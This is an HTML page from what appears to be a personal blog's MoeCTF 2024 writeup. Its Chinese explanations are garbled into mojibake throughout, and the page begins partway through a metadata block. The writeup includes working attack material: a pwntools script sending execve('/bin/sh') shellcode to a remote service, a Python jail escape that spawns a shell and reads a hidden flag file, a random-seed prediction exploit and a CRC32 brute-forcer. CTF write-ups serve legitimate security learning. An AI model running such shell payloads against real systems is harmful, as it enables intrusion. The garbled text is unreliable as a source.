æ¬¡çš„éšæœºæ•°éªŒè¯ï¼Œä½†æœ€åä¸¤ä¸ªæ— è®ºæ˜¯å¦æ­£ç¡®éƒ½ä¸ä¼šé€€å‡ºç¨‹åºï¼Œæ‰€ä»¥åªéœ€å‰é¢çš„ 0xA æ¬¡æ­£ç¡®å³å¯ï¼Œä¸è¿‡è¿™é“é¢˜çš„ç§å­ç”Ÿæˆç”¨åˆ°äº†localtimeï¼Œæ„Ÿè§‰åœ¨pythonä¸­æ¯”è¾ƒéš¾å®ç°æŒ‡é’ˆï¼Œä¼ªä»£ç å¦‚ä¸‹ï¼š\ntimer = time(0LL); v3 = localtime(\u0026timer); srandom(v3-\u003etm_yday); ä¹Ÿå°±æ˜¯è¯´æœ€åçš„seedæ˜¯v3-\u003etm_ydayï¼Œåæ¥äº†è§£äº†localtimeçš„ç”¨æ³•ï¼Œæ¯ä¸€å¤©å¯¹åº”çš„tm_ydayæ˜¯å›ºå®šçš„ï¼Œè¡¨ç¤ºä¸€å¹´ä¸­çš„ç¬¬å‡ å¤©ï¼Œå¯ä»¥å…ˆå†™ä¸€ä¸ªCè¯­è¨€ä»£ç å¼„å‡ºseedæ¥å†ç”¨pythonå†™äº¤äº’è„šæœ¬ï¼š\n#include #include #include int main () { struct tm *v3; time_t timer; int secret; timer = time(0); v3 = localtime(\u0026timer); srandom(v3-\u003etm_yday); printf(\"%d\\n\",v3-\u003etm_yday); secret = random() % 90000 + 10000; printf(\"%d\",secret); return 0; } æˆ‘åšæ­¤é¢˜æ—¥æœŸæ˜¯8.19ï¼Œæ‰€ä»¥seedæ˜¯231ï¼Œcè¯­è¨€ä»£ç è¿è¡Œç»“æœä¹Ÿæ˜¯å¦‚æ­¤ï¼š\n$ ./a.out 231 48149 from pwn import * from ctypes import * libc = cdll.LoadLibrary(\"./libc.so.6\") context(os='linux', arch='amd64', log_level='debug') #elf = ELF(\"./pwn\") #p = process(\"./pwn\") p = remote(\"127.0.0.1\",1307) libc.srand(231) for i in range(0,0xA): challenge_num = libc.random() % 90000 + 10000 p.sendlineafter(b\"Guess a five-digit number I'm thinking of\\n\u003e \",str(challenge_num).encode()) p.interactive() #åœ¨æ­¤ä¹‹åè¿˜è¦å†äº¤äº’ä¸¤æ¬¡ï¼Œéšä¾¿è¾“ä»€ä¹ˆæ•°å­—ï¼Œä¿è¯ç¨‹åºå¾€ä¸‹è¿›è¡Œè¾“å‡ºflagå³å¯ #moectf{ranDOM_NUMBer5-AR3_pr3D1cT4BI3607f0c} è¿™æ˜¯ä»€ä¹ˆï¼Ÿshellcodeï¼ å†™ä¸€æ®µshellcodeå‘è¿‡å»å³å¯ï¼Œç”¨shellcraftå¥½åƒä¹Ÿèƒ½æ‰“é€š\nfrom pwn import * from ctypes import * libc = cdll.LoadLibrary(\"./libc.so.6\") context(os='linux', arch='amd64', log_level='debug') #elf = ELF(\"./pwn\") #p = process(\"./pwn\") p = remote(\"192.168.1.6\",7971) shellcode = asm(''' mov rax,59 mov rbx,0x0068732f6e69622f push rbx mov rdi,rsp mov rsi,0 mov rdx,0 syscall ''') #shellcode = asm(shellcraft.sh()) p.sendlineafter(b\"\u003e\",shellcode) p.interactive() #moectf{GeTShELl-N3VER-S0-ea5y1a42caf12} å“¦ä¸ï¼æˆ‘çš„libcï¼ éé¢„æœŸï¼Œè¯•äº†ä¸‹å¸¸ç”¨çš„å‘½ä»¤ï¼Œcat ls more less head tailå•¥çš„åŸºæœ¬éƒ½ä¸èƒ½ç”¨äº†ï¼Œä¸è¿‡echoè¿˜èƒ½ç”¨ï¼Œç½‘ä¸Šæ‰¾åˆ°äº†å…³äºechoè¾“å‡ºæ–‡ä»¶å†…å®¹çš„èµ„æ–™ï¼Œå…ˆåˆ©ç”¨$(",
  "wordCount" : "8257",
  "inLanguage": "en",
  "datePublished": "2024-08-10T00:00:00Z",
  "dateModified": "2024-08-10T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://z9nn8w.github.io/posts/ctf/moectf-2024-writeup/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "w8nn9z Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://z9nn8w.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://z9nn8w.github.io/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://z9nn8w.github.io/search" title="æœç´¢ (Alt &#43; /)" accesskey=/>
                    <span>æœç´¢</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/posts" title="æ–‡ç« ">
                    <span>æ–‡ç« </span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/archives" title="å½’æ¡£">
                    <span>å½’æ¡£</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/about" title="å…³äº">
                    <span>å…³äº</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      MoeCTF 2024 Writeup
    </h1>
    <div class="post-meta"><span title='2024-08-10 00:00:00 +0000 UTC'>August 10, 2024</span>

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details >
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#%e6%9d%82%e9%a1%b9%e5%85%a5%e9%97%a8%e6%8c%87%e5%8c%97" aria-label="æ‚é¡¹å…¥é—¨æŒ‡åŒ—">æ‚é¡¹å…¥é—¨æŒ‡åŒ—</a></li>
                    <li>
                        <a href="#signin" aria-label="signin">signin</a></li>
                    <li>
                        <a href="#%e7%bd%97%e5%b0%8f%e9%bb%91%e6%88%98%e8%ae%b0" aria-label="ç½—å°é»‘æˆ˜è®°">ç½—å°é»‘æˆ˜è®°</a></li>
                    <li>
                        <a href="#ez_f5" aria-label="ez_F5">ez_F5</a></li>
                    <li>
                        <a href="#%e6%8d%82%e4%bd%8f%e4%b8%80%e5%8f%aa%e8%80%b3" aria-label="æ‚ä½ä¸€åªè€³">æ‚ä½ä¸€åªè€³</a></li>
                    <li>
                        <a href="#readme" aria-label="readme">readme</a></li>
                    <li>
                        <a href="#moejail_lv1" aria-label="moejail_lv1">moejail_lv1</a></li>
                    <li>
                        <a href="#ctfer2077" aria-label="ctfer2077â‘ ">ctfer2077â‘ </a></li>
                    <li>
                        <a href="#%e8%a7%a3%e4%b8%8d%e5%ae%8c%e7%9a%84%e5%8e%8b%e7%bc%a9%e5%8c%85" aria-label="è§£ä¸å®Œçš„å‹ç¼©åŒ…">è§£ä¸å®Œçš„å‹ç¼©åŒ…</a></li>
                    <li>
                        <a href="#the_secret_of_snowball" aria-label="the_secret_of_snowball">the_secret_of_snowball</a></li>
                    <li>
                        <a href="#%e6%af%8f%e4%ba%ba%e8%87%b3%e5%b0%91300%e4%bb%bd" aria-label="æ¯äººè‡³å°‘300ä»½">æ¯äººè‡³å°‘300ä»½</a></li>
                    <li>
                        <a href="#the-upside-and-down" aria-label="The upside and down">The upside and down</a></li>
                    <li>
                        <a href="#find-it" aria-label="Find It">Find It</a></li>
                    <li>
                        <a href="#ez_forensics" aria-label="ez_Forensics">ez_Forensics</a></li>
                    <li>
                        <a href="#ctfer2077-1" aria-label="ctfer2077â‘¡">ctfer2077â‘¡</a></li>
                    <li>
                        <a href="#%e6%8b%bc%e5%9b%be%e7%be%94%e6%89%8b" aria-label="æ‹¼å›¾ç¾”æ‰‹">æ‹¼å›¾ç¾”æ‰‹</a></li>
                    <li>
                        <a href="#moejail_lv2" aria-label="moejail_lv2">moejail_lv2</a></li>
                    <li>
                        <a href="#%e6%88%91%e7%9a%84%e5%9b%be%e5%b1%82%e5%9c%a8%e4%bd%a0%e4%b9%8b%e4%b8%8a" aria-label="æˆ‘çš„å›¾å±‚åœ¨ä½ ä¹‹ä¸Š">æˆ‘çš„å›¾å±‚åœ¨ä½ ä¹‹ä¸Š</a></li>
                    <li>
                        <a href="#%e6%97%b6%e5%85%89%e7%a9%bf%e6%a2%ad%e6%9c%ba" aria-label="æ—¶å…‰ç©¿æ¢­æœº">æ—¶å…‰ç©¿æ¢­æœº</a></li>
                    <li>
                        <a href="#ctfer2077-2" aria-label="ctfer2077â‘¢">ctfer2077â‘¢</a></li>
                    <li>
                        <a href="#ez_usbpcap" aria-label="ez_usbpcap">ez_usbpcap</a></li>
                    <li>
                        <a href="#abnormal-lag" aria-label="Abnormal lag">Abnormal lag</a></li>
                    <li>
                        <a href="#so-many-m" aria-label="so many &rsquo;m&#39;">so many &rsquo;m'</a></li>
                    <li>
                        <a href="#%e5%b0%8f%e5%b0%8f%e5%a5%97%e5%a8%83" aria-label="å°å°å¥—å¨ƒ">å°å°å¥—å¨ƒ</a></li>
                    <li>
                        <a href="#moejail_lv25" aria-label="moejail_lv2.5">moejail_lv2.5</a></li>
                    <li>
                        <a href="#moejail_lv3" aria-label="moejail_lv3">moejail_lv3</a></li>
                    <li>
                        <a href="#moejail_lv4" aria-label="moejail_lv4">moejail_lv4</a></li>
                    <li>
                        <a href="#web%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95%e4%b8%8e%e5%ae%a1%e8%ae%a1%e5%85%a5%e9%97%a8%e6%8c%87%e5%8c%97" aria-label="Webæ¸—é€æµ‹è¯•ä¸å®¡è®¡å…¥é—¨æŒ‡åŒ—">Webæ¸—é€æµ‹è¯•ä¸å®¡è®¡å…¥é—¨æŒ‡åŒ—</a></li>
                    <li>
                        <a href="#%e5%8b%87%e9%97%af%e9%93%9c%e4%ba%ba%e9%98%b5" aria-label="å‹‡é—¯é“œäººé˜µ">å‹‡é—¯é“œäººé˜µ</a></li>
                    <li>
                        <a href="#whos-blog" aria-label="who&rsquo;s blog?">who&rsquo;s blog?</a></li>
                    <li>
                        <a href="#imagecloud" aria-label="ImageCloud">ImageCloud</a></li>
                    <li>
                        <a href="#%e4%ba%8c%e8%bf%9b%e5%88%b6%e6%bc%8f%e6%b4%9e%e5%ae%a1%e8%ae%a1%e5%85%a5%e9%97%a8%e6%8c%87%e5%8c%97" aria-label="äºŒè¿›åˆ¶æ¼æ´å®¡è®¡å…¥é—¨æŒ‡åŒ—">äºŒè¿›åˆ¶æ¼æ´å®¡è®¡å…¥é—¨æŒ‡åŒ—</a></li>
                    <li>
                        <a href="#flag_helper" aria-label="flag_helper">flag_helper</a></li>
                    <li>
                        <a href="#notenoughtime" aria-label="NotEnoughTime">NotEnoughTime</a></li>
                    <li>
                        <a href="#no_more_gets" aria-label="no_more_gets">no_more_gets</a></li>
                    <li>
                        <a href="#moeplane" aria-label="Moeplane">Moeplane</a></li>
                    <li>
                        <a href="#leak_sth" aria-label="leak_sth">leak_sth</a></li>
                    <li>
                        <a href="#loginsystem" aria-label="LoginSystem">LoginSystem</a></li>
                    <li>
                        <a href="#ez_shellcode" aria-label="ez_shellcode">ez_shellcode</a></li>
                    <li>
                        <a href="#%e8%bf%99%e6%98%af%e4%bb%80%e4%b9%88random" aria-label="è¿™æ˜¯ä»€ä¹ˆï¼Ÿrandomï¼">è¿™æ˜¯ä»€ä¹ˆï¼Ÿrandomï¼</a></li>
                    <li>
                        <a href="#%e8%bf%99%e6%98%af%e4%bb%80%e4%b9%88shellcode" aria-label="è¿™æ˜¯ä»€ä¹ˆï¼Ÿshellcodeï¼">è¿™æ˜¯ä»€ä¹ˆï¼Ÿshellcodeï¼</a></li>
                    <li>
                        <a href="#%e5%93%a6%e4%b8%8d%e6%88%91%e7%9a%84libc" aria-label="å“¦ä¸ï¼æˆ‘çš„libcï¼">å“¦ä¸ï¼æˆ‘çš„libcï¼</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><h2 id="æ‚é¡¹å…¥é—¨æŒ‡åŒ—">æ‚é¡¹å…¥é—¨æŒ‡åŒ—<a hidden class="anchor" aria-hidden="true" href="#æ‚é¡¹å…¥é—¨æŒ‡åŒ—">#</a></h2>
<p>æµ·æŠ¥å³ä¾§æœ‰ä¸€æ®µæ‘©æ–¯å¯†ç 
moectf{H4VE_A_G00D_T1ME}</p>
<hr>
<h2 id="signin">signin<a hidden class="anchor" aria-hidden="true" href="#signin">#</a></h2>
<p>ç›´æ¥å…ˆç»™æ‰€æœ‰äººå…¨ç­¾ä¸ªåˆ°ï¼Œå†æŠŠluoæ”¹æˆç¼ºå‹¤å³å¯å®Œæˆä»»åŠ¡æ‹¿åˆ°flag</p>
<p><img loading="lazy" src="/images/MoeCTF2024/MISC/1.png"></p>
<p>moectf{Thanks_For_You_signing_in_4ND_W3l0c0me_T0_M0ecTf_2024!!!}</p>
<hr>
<h2 id="ç½—å°é»‘æˆ˜è®°">ç½—å°é»‘æˆ˜è®°<a hidden class="anchor" aria-hidden="true" href="#ç½—å°é»‘æˆ˜è®°">#</a></h2>
<p>WPSå›¾ç‰‡å¯ä»¥ç›´æ¥é€å¸§çœ‹ï¼Œå…¶ä¸­æœ‰ä¸ªäºŒç»´ç ï¼Œæ‰«ç å‡ºflag</p>
<p>moectf{y0uu6r3th3m0st3r1nth1sf13ld}</p>
<hr>
<h2 id="ez_f5">ez_F5<a hidden class="anchor" aria-hidden="true" href="#ez_f5">#</a></h2>
<p>F5ç®—æ³•åŠ å¯†çš„jpgå›¾ç‰‡ï¼Œwinhexæ‰“å¼€å°±èƒ½çœ‹åˆ°æœ‰ä¸€æ®µbase32ï¼Œè§£ç å†…å®¹å’Œbase32ä¹‹åçš„å†…å®¹ä¸€è‡´ï¼Œno_password</p>
<p>å¯ä»¥ç›´æ¥ç”¨<strong>F5-steganography</strong>ä¸€æŠŠæ¢­   <a href="https://github.com/matthewgao/F5-steganography">https://github.com/matthewgao/F5-steganography</a></p>
<p>ä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ²¡å¯†ç ï¼Œåæ¥å‘ç°å¯†ç å°±æ˜¯no_passwordï¼Œä¸è¿‡è¦æ³¨æ„javaç‰ˆæœ¬ä¸èƒ½å¤ªé«˜</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>java Extract suantouwangba.jpg -p no_password
</span></span></code></pre></div><p>å¯ä»¥åœ¨output.txtä¸­çœ‹åˆ°è§£å¯†çš„å†…å®¹ï¼šmoectf{F5_15_s0_lntere5t1n9}</p>
<hr>
<h2 id="æ‚ä½ä¸€åªè€³">æ‚ä½ä¸€åªè€³<a hidden class="anchor" aria-hidden="true" href="#æ‚ä½ä¸€åªè€³">#</a></h2>
<p>daylightéŸ³é¢‘ç›´æ¥å¬èƒ½å¬åˆ°ä¸€ä¸²æ•°å­— <code>63 31 43 31 41 52 31 51 71 101</code></p>
<p>çœ‹äº†æç¤ºï¼ŒçŸ¥é“æ•°å­—æ˜¯åªå’Œé”®ç›˜å­—æ¯æœ‰å…³çš„åæ ‡ï¼Œä¸€ä¸€å¯¹åº”èµ·æ¥ï¼Œæ³¨æ„å¼€å¤§å†™é”å®šcaps</p>
<p>moectf{NEVERGIVEUP}</p>
<hr>
<h2 id="readme">readme<a hidden class="anchor" aria-hidden="true" href="#readme">#</a></h2>
<p><code>/proc/pid</code>ç›®å½•ä¸­å­˜åœ¨å…³äºpidè¿›ç¨‹çš„ä¿¡æ¯ï¼Œé€šè¿‡æ–‡ä»¶æè¿°ç¬¦fdå³<code>/proc/pid/fd/3</code>å¯ä»¥è¯»å–æœªè¢«å…³é—­çš„æ–‡ä»¶å†…å®¹ï¼Œè‹¥æ˜¯å½“å‰è¿›ç¨‹ï¼Œåˆ™pidå¯ä»¥æ˜¯selfï¼Œæ•…é€šè¿‡<code>/proc/self/fd/3</code>å³å¯è¯»å–å½“å‰è¿›ç¨‹ä¸‹ç¬¬ä¸€ä¸ªæ‰“å¼€ä½†æœªå…³é—­çš„æ–‡ä»¶<code>/tmp/therealflag</code>ä¸­çš„å†…å®¹ï¼Œå³ä½¿åŸæ–‡ä»¶è¢«åˆ é™¤äº†</p>
<p><img loading="lazy" src="/images/MoeCTF2024/MISC/2.png"></p>
<hr>
<h2 id="moejail_lv1">moejail_lv1<a hidden class="anchor" aria-hidden="true" href="#moejail_lv1">#</a></h2>
<p>å¯ä»¥ç›´æ¥æ‹¿shellï¼Œç„¶åæ‰¾æ‰¾flagåœ¨å“ªï¼Œå‘ç°è¢«éšè—/tmpç›®å½•ä¸‹ï¼Œflagæ–‡ä»¶åå­—å¾ˆé•¿å¯ä»¥ç”¨é€šé…ç¬¦*æ›¿ä»£</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Give me your payload:__import__<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;os&#39;</span><span style="color:#f92672">)</span>.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>ls /tmp -al
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">12</span>
</span></span><span style="display:flex;"><span>drwxrwxrwt    <span style="color:#ae81ff">1</span> root     root          <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">16</span> 11:18 .
</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">1</span> root     root          <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">16</span> 11:18 ..
</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1000</span>     root            <span style="color:#ae81ff">63</span> Aug <span style="color:#ae81ff">16</span> 11:18 .therealflag_c7d07b4afdbfcc56e4a5c8066159380c85fe7bdb76da1ebad9f3622bba21f423ad5972ff2720a7b8f03903e883b49782afc9efa4d50144b1e0973cc6a421a6f4  -
</span></span><span style="display:flex;"><span>cat /tmp/.t*
</span></span><span style="display:flex;"><span>moectf<span style="color:#f92672">{</span>Ah_h4-NOw_YOU_Know_hoW_tO-3ScaPe_5ImPL3-STRINg_flLter0<span style="color:#f92672">}</span>
</span></span></code></pre></div><hr>
<h2 id="ctfer2077">ctfer2077â‘ <a hidden class="anchor" aria-hidden="true" href="#ctfer2077">#</a></h2>
<p>å¦‚æœç›´æ¥æ‰«ç ä¼šå¾—åˆ°ä¸€ä¸²å†…å®¹ï¼Œæœ‰ä¸ªBVå·ï¼Œçœ‹äº†å°±ä¼šå‘ç°è¢«éª—äº†ï¼ˆ</p>
<p>çœŸçš„flagå†…å®¹åœ¨lsbéšå†™é‡Œï¼Œzstegä¸€æŠŠæ¢­</p>
<p><img loading="lazy" src="/images/MoeCTF2024/MISC/3.png"></p>
<hr>
<h2 id="è§£ä¸å®Œçš„å‹ç¼©åŒ…">è§£ä¸å®Œçš„å‹ç¼©åŒ…<a hidden class="anchor" aria-hidden="true" href="#è§£ä¸å®Œçš„å‹ç¼©åŒ…">#</a></h2>
<p>999.zipè„šæœ¬è§£ä¸€ä¸‹ï¼Œåˆ°æœ€åä¸€å±‚æœ‰ä¸ªcccccccrc.zipï¼Œå†ä»ç½‘ä¸Šæ‰¾ä¸€ä¸ªcrc32è„šæœ¬çˆ†ç ´ä¸€ä¸‹æ‹¿åˆ°å¯†ç pwdï¼Œè§£å‹ç¼©åŒ…æ‹¿flag</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> zipfile
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>save_path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./zip&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">999</span>,<span style="color:#ae81ff">0</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>    zip_path<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;./zip/</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.zip&#34;</span><span style="color:#f92672">.</span>format(i)
</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">=</span>zipfile<span style="color:#f92672">.</span>ZipFile(zip_path)
</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">.</span>extractall(save_path)
</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74">&#34;./zip/</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.zip&#34;</span><span style="color:#f92672">.</span>format(i))
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> binascii
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">crack_crc</span>():
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;-------------Start Crack CRC-------------&#39;</span>)
</span></span><span style="display:flex;"><span>    crc_list <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0xf812a17e</span>, <span style="color:#ae81ff">0x43dfeaa4</span>, <span style="color:#ae81ff">0xc617bdf4</span>, <span style="color:#ae81ff">0x1db1c332</span>]<span style="color:#75715e">#æ–‡ä»¶çš„CRC32å€¼åˆ—è¡¨ï¼Œæ³¨æ„é¡ºåº</span>
</span></span><span style="display:flex;"><span>    comment <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    chars <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>printable
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> crc_value <span style="color:#f92672">in</span> crc_list:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> char1 <span style="color:#f92672">in</span> chars:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> char2 <span style="color:#f92672">in</span> chars:
</span></span><span style="display:flex;"><span>                res_char <span style="color:#f92672">=</span> char1 <span style="color:#f92672">+</span> char2<span style="color:#75715e">#è·å–éå†çš„ä»»æ„2Byteå­—ç¬¦</span>
</span></span><span style="display:flex;"><span>                char_crc <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>crc32(res_char<span style="color:#f92672">.</span>encode())<span style="color:#75715e">#è·å–éå†å­—ç¬¦çš„CRC32å€¼</span>
</span></span><span style="display:flex;"><span>                calc_crc <span style="color:#f92672">=</span> char_crc <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span><span style="color:#75715e">#å°†è·å–åˆ°çš„å­—ç¬¦çš„CRC32å€¼ä¸0xffffffffè¿›è¡Œä¸è¿ç®—</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> calc_crc <span style="color:#f92672">==</span> crc_value:<span style="color:#75715e">#å°†è·å–å­—ç¬¦çš„CRC32å€¼ä¸æ¯ä¸ªæ–‡ä»¶çš„CRC32å€¼è¿›è¡ŒåŒ¹é…</span>
</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">&#39;[+] </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(hex(crc_value),res_char))
</span></span><span style="display:flex;"><span>                    comment <span style="color:#f92672">+=</span> res_char
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;-----------CRC Crack Completed-----------&#39;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;Result: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(comment))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    crack_crc()
</span></span></code></pre></div><p>moectf{af9c688e-e0b9-4900-879c-672b44c550ea}</p>
<hr>
<h2 id="the_secret_of_snowball">the_secret_of_snowball<a hidden class="anchor" aria-hidden="true" href="#the_secret_of_snowball">#</a></h2>
<p>jpgæ–‡ä»¶å¤´æœ‰é—®é¢˜ï¼Œæ”¹æˆ<code>FF D8</code>ï¼Œå›¾ç‰‡æ­£å¸¸æ‰“å¼€å°±èƒ½çœ‹åˆ°å‰ä¸€æ®µflagäº†ï¼Œæ–‡ä»¶å°¾æœ‰ä¸€ä¸²base64ï¼Œç›´æ¥è§£æ‹¿åˆ°ååŠæ®µflag</p>
<p>moectf{Welc0me_t0_the_secret_life_0f_Misc!}</p>
<hr>
<h2 id="æ¯äººè‡³å°‘300ä»½">æ¯äººè‡³å°‘300ä»½<a hidden class="anchor" aria-hidden="true" href="#æ¯äººè‡³å°‘300ä»½">#</a></h2>
<p>äºŒç»´ç ç¢ç‰‡å¾ˆå‹å¥½ï¼Œä»ä¸­é—´åˆ‡çš„ï¼Œè¿˜æ²¡æœ‰æ—‹è½¬ï¼ŒäºŒç»´ç å¯ä»¥ç›´æ¥æ‹¼å‡ºæ¥ï¼š</p>
<p><img loading="lazy" src="/images/MoeCTF2024/MISC/4.png"></p>
